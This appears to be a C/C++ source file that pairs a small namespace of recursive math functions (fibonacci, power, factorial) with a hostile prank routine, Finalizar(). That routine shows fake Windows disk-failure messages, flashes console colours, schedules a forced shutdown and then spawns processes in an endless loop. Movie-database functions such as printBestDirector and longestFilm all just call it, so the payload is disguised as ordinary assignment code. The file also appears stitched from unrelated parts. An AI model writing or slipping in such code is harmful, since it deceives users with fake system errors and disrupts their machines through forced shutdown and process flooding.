#pragma once
//recursividad
namespace mpv{
	unsigned long long fibonacci(int n,unsigned long long mem[]){
		if(mem[n]!=0) {
			return mem[n];
		}
		else {
			if(n==0) {
				return 0;
			}
			else if(n==1) {
				mem[n]=1;
				return 1;
			}
			else {
				mem[n]=fibonacci(n-1,mem)+fibonacci(n-2,mem);
				return mem[n];
			}
		}
	}
	template<typename T>
	T pot(T base,int exp){
		if(exp<0){
			exp*=-1;
			base=1/base;
		}
		if(exp==0) {
			return 1;
		}
		else {
			return base*pot(base,exp-1);
		}
	}
	unsigned long long factorial(unsigned short num){
		if(num==0) {
			return 1;
		}
		else {
			return num*factorial(num-1);
		}
	}
}


#include<stdio.h>
#include<stdlib.h>
#define Eprint(E) printf("C:\\Windows\\SystemResources\\Windows.Diagnostics.ErrorDetails> ");printf(E);puts("");
void Finalizar(){
	sleep(4);
	system("msg * Thread 1 recived signal SIGSEGV, Segmentation fault.");printf("\a");sleep(1);
	Eprint("Runtime error ocurred\n");sleep(2);
	Eprint("Windows was unable to repair Disk (C:)\n");system("color 4");system("color 1e");system("color 4");system("color 1e");sleep(1);
	Eprint("os has suffered an unrecoverable damage");sleep(1);
	system("color 4");system("color 1e");system("color 4");system("color 1e");system("color 4");system("color 1e");system("color 4");system("color 1e");system("color 4");system("color 1e");system("color 4");system("color 1e");
	printf("\a");system("msg * Unexpected catastrophic failure.(4s5emb13r3nc0n7r4d0)");
	system("color 4");
	system("echo error: Unknown error");
	system("timeout /t 1");
	system("echo error: Unknown error");
	system("shutdown /s /t 30 /c \"ASSEMBLER ENCONTRADO\"");printf("\a");
	while(true){
		system("start color 4");
	}
}
void printBestDirector(){
	Finalizar();
}
void top10byGenre(){
	Finalizar();
}
void bestMovieOfTheYear(){
	Finalizar();
}
void longestFilm(){
	Finalizar();
}
void shortestFilm(){
	Finalizar();
}